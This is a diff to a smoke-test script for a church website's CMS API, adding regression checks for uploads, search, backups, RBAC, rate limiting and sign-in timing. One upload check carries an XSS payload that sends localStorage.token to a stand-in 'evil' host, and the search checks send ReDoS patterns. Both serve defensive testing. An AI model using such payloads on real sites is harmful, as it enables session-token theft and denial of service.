@@ -13,6 +13,15 @@ const { MongoMemoryServer } = require("mongodb-memory-server");
 const PORT = 4123;
 const BASE = `http://127.0.0.1:${PORT}/v1`;
 
+/** A genuine 1×1 PNG, for asserting that real images still get through. */
+function sharpPixel() {
+  return require("sharp")({
+    create: { width: 1, height: 1, channels: 3, background: "#a81b5e" },
+  })
+    .png()
+    .toBuffer();
+}
+
 async function json(response) {
   const text = await response.text();
   try {
@@ -29,6 +38,13 @@ async function main() {
   process.env.PUBLIC_URL = `http://127.0.0.1:${PORT}`;
   process.env.JWT_ACCESS_SECRET = "smoke-access";
   process.env.JWT_REFRESH_SECRET = "smoke-refresh";
+  /*
+   * Mirrors a deployment behind a reverse proxy — the container's own router is
+   * one — so `req.ip` comes from `X-Forwarded-For`. That is what the rate
+   * limiter buckets by, and the checks below rely on it to get a bucket of
+   * their own instead of fighting over the shared one.
+   */
+  process.env.TRUST_PROXY = "true";
   process.env.SEED_ADMIN_EMAIL = "admin@example.org";
   process.env.SEED_ADMIN_PASSWORD = "Password@123";
   // The demo event and announcement are opt-in, so a real installation never
@@ -99,6 +115,47 @@ async function main() {
   await check("GET /blog returns array", async () => {
     const body = await json(await fetch(`${BASE}/blog`));
     assert(Array.isArray(body));
+  });
+
+  /*
+   * The two filters `WebsiteRT/src/services/blog.service.ts` depends on:
+   * `getBlogPostsByEvent` renders "read more about this" on an event page, and
+   * `getBlogPostsByFellowship` fills each fellowship's own news list.
+   *
+   * Worth asserting because the failure is silent and wrong rather than loud:
+   * an ignored query parameter returns *every* published post with a 200, so
+   * each event page would quietly list the whole blog and nothing would error.
+   */
+  await check("GET /blog?event= and ?fellowship= actually filter", async () => {
+    const posts = await json(await fetch(`${BASE}/blog`));
+    const tagged = posts.find((post) => post.eventSlug);
+    if (tagged) {
+      const scoped = await json(
+        await fetch(`${BASE}/blog?event=${encodeURIComponent(tagged.eventSlug)}`),
+      );
+      assert(Array.isArray(scoped), "must stay a plain array when filtered");
+      assert(scoped.length >= 1, "the event's own post should be returned");
+      assert(
+        scoped.every((post) => post.eventSlug === tagged.eventSlug),
+        "?event= let through posts about other events",
+      );
+    }
+
+    const filed = posts.find((post) => post.fellowshipSlug);
+    if (filed) {
+      const scoped = await json(
+        await fetch(`${BASE}/blog?fellowship=${filed.fellowshipSlug}`),
+      );
+      assert(
+        Array.isArray(scoped) &&
+          scoped.every((post) => post.fellowshipSlug === filed.fellowshipSlug),
+        "?fellowship= let through other fellowships' posts",
+      );
+    }
+
+    // A slug nobody used must come back empty, not fall back to everything.
+    const none = await json(await fetch(`${BASE}/blog?event=no-such-event-slug`));
+    assert.deepEqual(none, [], "an unmatched ?event= returned posts anyway");
   });
 
   await check("GET /gallery + /gallery/slugs", async () => {
@@ -424,6 +481,62 @@ async function main() {
     assert.equal(fetched.status, 200, `uploaded video not served: ${fetched.status}`);
   });
 
+  await check("Upload cannot smuggle HTML in under an image content-type", async () => {
+    /*
+     * The stored extension used to come from the client's filename while only
+     * the client's content-type was checked, so these two could disagree and
+     * the filename won: `payload.html` declared `image/png` landed in
+     * `uploads/images/` and was served back as `text/html`. Behind the
+     * container's router that is the CMS's own origin, and tokens live in
+     * localStorage.
+     */
+    const form = new FormData();
+    const html = "<script>fetch('//evil/'+localStorage.token)</script>";
+    form.append(
+      "file",
+      new Blob([Buffer.from(html)], { type: "image/png" }),
+      "payload.html",
+    );
+    const res = await fetch(`${BASE}/admin/media`, {
+      method: "POST",
+      headers: { Authorization: `Bearer ${tokens.accessToken}` },
+      body: form,
+    });
+    assert.equal(res.status, 400, `expected 400, got ${res.status}`);
+
+    // And a real image must still land under an extension matching its type,
+    // never under the one the caller asked for.
+    const pngForm = new FormData();
+    const png = await sharpPixel();
+    pngForm.append("file", new Blob([png], { type: "image/png" }), "innocent.html");
+    const ok = await fetch(`${BASE}/admin/media`, {
+      method: "POST",
+      headers: { Authorization: `Bearer ${tokens.accessToken}` },
+      body: pngForm,
+    });
+    assert.equal(ok.status, 201, `expected 201, got ${ok.status}`);
+    const item = await json(ok);
+    assert(item.url.endsWith(".png"), `stored as ${item.url}, expected .png`);
+    assert(!item.url.includes(".html"), "the caller's extension reached disk");
+  });
+
+  await check("Search terms are matched literally, not as patterns", async () => {
+    /*
+     * `{ $regex: term }` compiles whatever arrives. Unescaped, `(` is a driver
+     * syntax error (a 500 from typing a bracket) and `(a+)+$` is a denial of
+     * service any `content.read` holder — including a viewer — could trigger.
+     */
+    for (const term of ["(", "(a+)+$", "*", "[", "\\"]) {
+      const res = await fetch(
+        `${BASE}/admin/blog?search=${encodeURIComponent(term)}`,
+        { headers: auth() },
+      );
+      assert.equal(res.status, 200, `search ${JSON.stringify(term)} → ${res.status}`);
+      const body = await json(res);
+      assert(Array.isArray(body.items), "expected a paginated envelope");
+    }
+  });
+
   await check("Media library still refuses genuinely unsupported types", async () => {
     const form = new FormData();
     form.append("file", new Blob([Buffer.from("#!/bin/sh\n")], { type: "application/x-sh" }), "x.sh");
@@ -501,6 +614,345 @@ async function main() {
       body: JSON.stringify({}),
     });
     assert.equal(res.status, 403, `viewer create → ${res.status}`);
+  });
+
+  await check("PATCH null removes an optional field instead of ignoring it", async () => {
+    const created = await json(
+      await fetch(`${BASE}/admin/blog`, {
+        method: "POST",
+        headers: auth(),
+        body: JSON.stringify({
+          title: { en: "Clearing test", ta: "…" },
+          excerpt: { en: "Has a cover to begin with.", ta: "…" },
+          body: [{ en: "One paragraph.", ta: "…" }],
+          publishedAt: "2026-08-01",
+          author: { en: "Church Office", ta: "…" },
+          coverImage: {
+            url: `http://127.0.0.1:${PORT}/uploads/images/cover.jpg`,
+            alt: { en: "A cover", ta: "…" },
+            width: 1200,
+            height: 800,
+          },
+          fellowshipSlug: "choir",
+        }),
+      }),
+    );
+    assert(created.coverImage?.url, "the post should start with a cover image");
+    assert.equal(created.fellowshipSlug, "choir");
+
+    /*
+     * Omitting a key means "leave it alone", so removal has to be said out
+     * loud. Before this, the CMS omitted the key and a cleared cover image
+     * saved successfully without changing anything.
+     */
+    const patched = await json(
+      await fetch(`${BASE}/admin/blog/${created.id}`, {
+        method: "PATCH",
+        headers: auth(),
+        body: JSON.stringify({ coverImage: null, fellowshipSlug: null }),
+      }),
+    );
+    assert.equal(patched.coverImage, undefined, "coverImage must be gone, not null");
+    assert.equal(patched.fellowshipSlug, undefined, "fellowshipSlug must be gone");
+
+    // …and stay gone once re-read, rather than only looking gone in the reply.
+    const reread = await json(
+      await fetch(`${BASE}/admin/blog/${created.id}`, { headers: auth() }),
+    );
+    assert.equal(reread.coverImage, undefined, "coverImage came back on re-read");
+
+    // An omitted key must still mean "leave alone" — the other half of the
+    // contract, and the half everything else in the CMS relies on.
+    const untouched = await json(
+      await fetch(`${BASE}/admin/blog/${created.id}`, {
+        method: "PATCH",
+        headers: auth(),
+        body: JSON.stringify({ excerpt: { en: "Edited.", ta: "…" } }),
+      }),
+    );
+    assert.equal(untouched.title.en, "Clearing test", "an omitted title must survive");
+    assert.equal(untouched.excerpt.en, "Edited.");
+
+    await fetch(`${BASE}/admin/blog/${created.id}`, { method: "DELETE", headers: auth() });
+  });
+
+  await check("Contact inbox searches sender, subject and body", async () => {
+    await fetch(`${BASE}/contact`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        name: "Anbu Selvam",
+        email: "anbu@example.org",
+        subject: "Baptism enquiry",
+        message: "We would like to ask about arranging a baptism.",
+      }),
+    });
+
+    const bySender = await json(
+      await fetch(`${BASE}/admin/contact-messages?search=anbu`, { headers: auth() }),
+    );
+    assert.equal(bySender.total, 1, "search must match the sender's name");
+
+    // The body is searched too — people hunt for a half-remembered phrase.
+    const byBody = await json(
+      await fetch(`${BASE}/admin/contact-messages?search=arranging`, { headers: auth() }),
+    );
+    assert.equal(byBody.total, 1, "search must reach into the message body");
+
+    /*
+     * A regex metacharacter must be treated as text. Unescaped, `(` is a
+     * syntax error the driver raises — a 500 from typing a bracket into a
+     * search box.
+     */
+    const res = await fetch(`${BASE}/admin/contact-messages?search=${encodeURIComponent("a(b")}`, {
+      headers: auth(),
+    });
+    assert.equal(res.status, 200, `metacharacter search → ${res.status}`);
+    assert.equal((await json(res)).total, 0, "a literal 'a(b' matches nothing");
+  });
+
+  /*
+   * Backup and restore is the one place in the CMS where a mistake destroys
+   * data, so it is exercised end to end rather than endpoint by endpoint: take
+   * a real archive, change the database, restore, and assert the change is
+   * gone. Anything less would pass on a restore that quietly writes nothing.
+   *
+   * Runs last because a `replace` restore rolls the whole database — including
+   * `users` — back to the moment the archive was taken, which would pull the
+   * ground out from under every check above it.
+   */
+  console.log("\nBackup & restore:");
+
+  let ticket;
+  let archive;
+
+  await check("GET /admin/backup/preview counts the whole installation", async () => {
+    const body = await json(await fetch(`${BASE}/admin/backup/preview`, { headers: auth() }));
+    assert(body.collections.events >= 1, "expected the events collection");
+    assert(body.collections.users >= 1, "expected the users collection");
+    assert(body.documents > 0, "expected a document total");
+    assert.equal(typeof body.estimatedSize, "string");
+  });
+
+  await check("POST /admin/backup archives every collection and the media", async () => {
+    const res = await fetch(`${BASE}/admin/backup`, { method: "POST", headers: auth() });
+    assert.equal(res.status, 201, `expected 201, got ${res.status}`);
+    ticket = await json(res);
+    assert.equal(ticket.manifest.format, "csistmc-portal-backup");
+    assert(ticket.manifest.collections.events >= 1, "events must be in the manifest");
+    assert(ticket.manifest.collections.users >= 1, "users must be in the manifest");
+    assert(ticket.manifest.uploads.files >= 1, "the uploaded video must be carried");
+    assert(ticket.sizeBytes > 0 && ticket.size, "expected a sized archive");
+  });
+
+  await check("the archive downloads on its token, and only on its token", async () => {
+    // Unauthenticated on purpose — a browser download cannot send a Bearer
+    // header. The token in the path is what stands in for it.
+    const res = await fetch(`${BASE}${ticket.downloadPath}`);
+    assert.equal(res.status, 200, `expected 200, got ${res.status}`);
+    assert.equal(res.headers.get("content-type"), "application/zip");
+    archive = Buffer.from(await res.arrayBuffer());
+    assert.equal(archive.length, ticket.sizeBytes, "Content-Length must match the archive");
+    assert.equal(archive.subarray(0, 2).toString(), "PK", "expected a zip");
+
+    const wrong = await fetch(`${BASE}/admin/backup/${ticket.id}/download?token=not-the-token`);
+    assert.equal(wrong.status, 404, `wrong token → ${wrong.status}`);
+  });
+
+  // A record that exists *after* the archive was taken. A working `replace`
+  // restore must remove it; a restore that silently no-ops would leave it.
+  let markerId;
+  await check("staging an upload reports the manifest and writes nothing", async () => {
+    const created = await json(
+      await fetch(`${BASE}/admin/announcements`, {
+        method: "POST",
+        headers: auth(),
+        body: JSON.stringify({
+          title: { en: "Written after the backup", ta: "காப்புப்பிரதிக்குப் பிறகு" },
+          body: { en: "Should not survive a replace restore.", ta: "…" },
+          publishedAt: "2026-08-08",
+        }),
+      }),
+    );
+    markerId = created.id;
+    assert(markerId, "expected the marker announcement to be created");
+
+    const form = new FormData();
+    form.append("file", new Blob([archive], { type: "application/zip" }), "backup.zip");
+    const res = await fetch(`${BASE}/admin/backup/restore`, {
+      method: "POST",
+      headers: { Authorization: `Bearer ${tokens.accessToken}` },
+      body: form,
+    });
+    assert.equal(res.status, 200, `expected 200, got ${res.status}`);
+    const staged = await json(res);
+    assert(staged.id, "expected a staging id");
+    assert.equal(staged.manifest.capturedAt, ticket.manifest.capturedAt);
+    assert(
+      staged.warnings.some((w) => w.includes("Admin accounts")),
+      "restoring users must be called out in the warnings",
+    );
+
+    // Nothing applied yet.
+    const still = await fetch(`${BASE}/admin/announcements/${markerId}`, { headers: auth() });
+    assert.equal(still.status, 200, "staging must not touch the database");
+    ticket.stagedId = staged.id;
+  });
+
+  await check("a replace restore rolls the database back to the archive", async () => {
+    const res = await fetch(`${BASE}/admin/backup/restore/${ticket.stagedId}`, {
+      method: "POST",
+      headers: auth(),
+      body: JSON.stringify({ mode: "replace", safetyBackup: true }),
+    });
+    assert.equal(res.status, 200, `expected 200, got ${res.status}`);
+    const result = await json(res);
+    assert.equal(result.mode, "replace");
+    assert(result.documents > 0, "expected documents restored");
+    assert.equal(result.usersReplaced, true, "the users collection was in the archive");
+    assert(result.safetyBackup?.downloadPath, "a safety backup must be offered back");
+
+    const gone = await fetch(`${BASE}/admin/announcements/${markerId}`, { headers: auth() });
+    assert.equal(gone.status, 404, `marker survived the restore → ${gone.status}`);
+
+    // …and the content that was in the archive is back, addressable as before:
+    // `_id` is preserved, so the seeded event keeps its slug and its links.
+    const events = await json(await fetch(`${BASE}/events`));
+    assert(events.length >= 1, "restored events must be served again");
+
+    // The safety backup's link still works even though `users` was rewritten —
+    // its token is not tied to the session that asked for it.
+    const rollback = await fetch(`${BASE}${result.safetyBackup.downloadPath}`);
+    assert.equal(rollback.status, 200, `safety backup unreachable → ${rollback.status}`);
+  });
+
+  await check("restore refuses a file that is not a Portal backup", async () => {
+    const form = new FormData();
+    form.append("file", new Blob([Buffer.from("not a zip")], { type: "application/zip" }), "x.zip");
+    const res = await fetch(`${BASE}/admin/backup/restore`, {
+      method: "POST",
+      headers: { Authorization: `Bearer ${tokens.accessToken}` },
+      body: form,
+    });
+    assert.equal(res.status, 400, `expected 400, got ${res.status}`);
+  });
+
+  await check("RBAC: not even an admin may back up or restore", async () => {
+    await fetch(`${BASE}/admin/users`, {
+      method: "POST",
+      headers: auth(),
+      body: JSON.stringify({
+        name: "Ordinary Admin",
+        email: "admin2@example.org",
+        password: "Password@123",
+        role: "admin",
+      }),
+    });
+    const login = await json(
+      await fetch(`${BASE}/auth/login`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email: "admin2@example.org", password: "Password@123" }),
+      }),
+    );
+    const asAdmin = {
+      Authorization: `Bearer ${login.accessToken}`,
+      "Content-Type": "application/json",
+    };
+
+    // Both halves are super-admin only. The archive is the whole database in
+    // one file — an admin who can download it has every password hash in the
+    // installation, whether or not they can put one back.
+    const preview = await fetch(`${BASE}/admin/backup/preview`, { headers: asAdmin });
+    assert.equal(preview.status, 403, `admin preview → ${preview.status}`);
+
+    const build = await fetch(`${BASE}/admin/backup`, { method: "POST", headers: asAdmin });
+    assert.equal(build.status, 403, `admin backup → ${build.status}`);
+
+    const form = new FormData();
+    form.append("file", new Blob([archive], { type: "application/zip" }), "backup.zip");
+    const restore = await fetch(`${BASE}/admin/backup/restore`, {
+      method: "POST",
+      headers: { Authorization: `Bearer ${login.accessToken}` },
+      body: form,
+    });
+    assert.equal(restore.status, 403, `admin restore → ${restore.status}`);
+  });
+
+  await check("Sign-in throttling is per client, not one bucket for everyone", async () => {
+    /*
+     * `trust proxy` was unset, so behind the container's router every request in
+     * the world arrived as the same address and shared one 5/min bucket: a
+     * single attacker could lock every administrator out of sign-in, and every
+     * audit entry recorded the proxy instead of a person.
+     */
+    const login = (ip) =>
+      fetch(`${BASE}/auth/login`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "X-Forwarded-For": ip },
+        body: JSON.stringify({ email: "admin@example.org", password: "wrong-password" }),
+      });
+
+    let throttled = false;
+    for (let i = 0; i < 8; i += 1) {
+      if ((await login("198.51.100.7")).status === 429) throttled = true;
+    }
+    assert(throttled, "repeated failures from one address were never throttled");
+
+    // A different client must be unaffected by that one's exhausted budget.
+    const other = await login("198.51.100.8");
+    assert.equal(
+      other.status,
+      401,
+      `a second client inherited the first's rate limit (${other.status})`,
+    );
+  });
+
+  /*
+   * Deliberately the last check in the suite.
+   *
+   * Sign-in is rate limited to 5 attempts a minute, and this spends several of
+   * them on purpose. Run anywhere earlier it starves the logins the RBAC checks
+   * need, and those fail with a confusing 401 — no token, because the login that
+   * should have issued one was throttled.
+   */
+  await check("Sign-in takes the same time for unknown and known addresses", async () => {
+    // Each attempt from its own address, so the shared sign-in bucket is left
+    // alone and a rate limit can never be mistaken for a slow hash.
+    let host = 0;
+    const attempt = async (email) => {
+      host += 1;
+      const started = process.hrtime.bigint();
+      const res = await fetch(`${BASE}/auth/login`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": `203.0.113.${host}`,
+        },
+        body: JSON.stringify({ email, password: "definitely-not-the-password" }),
+      });
+      assert.equal(res.status, 401, `expected a rejected sign-in, got ${res.status}`);
+      return Number(process.hrtime.bigint() - started) / 1e6;
+    };
+
+    // One warm-up: the first bcrypt call carries native-module setup cost that
+    // would otherwise land entirely on whichever path ran first.
+    await attempt("warmup@example.org");
+
+    const known = await attempt("admin@example.org");
+    const unknown = await attempt("nobody@example.org");
+
+    /*
+     * Before the decoy hash, an unknown address returned without touching
+     * bcrypt at all — the gap was the whole cost of a hash, and a reliable way
+     * to enumerate who holds an account. Asserting the ratio rather than a
+     * millisecond figure keeps this meaningful on a slow machine.
+     */
+    const ratio = Math.max(known, unknown) / Math.max(1, Math.min(known, unknown));
+    assert(
+      ratio < 3,
+      `timing gap reveals which accounts exist: known ${known.toFixed(0)}ms vs unknown ${unknown.toFixed(0)}ms`,
+    );
   });
 
   await app.close();
